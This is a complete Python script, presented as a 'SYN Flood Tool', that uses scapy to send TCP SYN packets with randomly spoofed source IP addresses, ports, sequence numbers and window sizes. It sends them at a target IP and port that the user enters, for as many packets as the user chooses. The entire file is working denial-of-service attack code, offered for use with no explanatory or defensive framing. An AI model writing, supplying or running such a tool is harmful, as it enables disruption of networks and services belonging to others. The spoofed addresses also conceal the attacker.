from os import system
from sys import stdout
from scapy.all import *
from random import randint

def generate_random_ip():
    """Generate a random IPv4 address."""
    return ".".join(map(str, (randint(0, 255) for _ in range(4))))

def generate_random_port():
    """Generate a random port number between 1000 and 9000."""
    return randint(1000, 9000)

def syn_flood(dst_ip, dst_port, counter):
    """Perform a SYN Flood attack."""
    total_packets_sent = 0
    print("Packets are sending ...")

    for _ in range(counter):
        s_port = generate_random_port()
        s_eq = generate_random_port()
        window_size = generate_random_port()

        ip_packet = IP(src=generate_random_ip(), dst=dst_ip)
        tcp_packet = TCP(sport=s_port, dport=dst_port, flags="S", seq=s_eq, window=window_size)

        send(ip_packet / tcp_packet, verbose=0)
        total_packets_sent += 1

    stdout.write("\nTotal packets sent: %i\n" % total_packets_sent)

def get_info():
    """Prompt user for target IP and port."""
    system("clear")
    print("#####################################")
    print("# Welcome to Python3 SYN Flood Tool #")
    print("#####################################")

    dst_ip = input("\nTarget IP : ")
    dst_port = int(input("Target Port : "))
    
    return dst_ip, dst_port

def main():
    dst_ip, dst_port = get_info()
    counter = int(input("How many packets do you want to send : "))
    syn_flood(dst_ip, dst_port, counter)

if __name__ == "__main__":
    main()
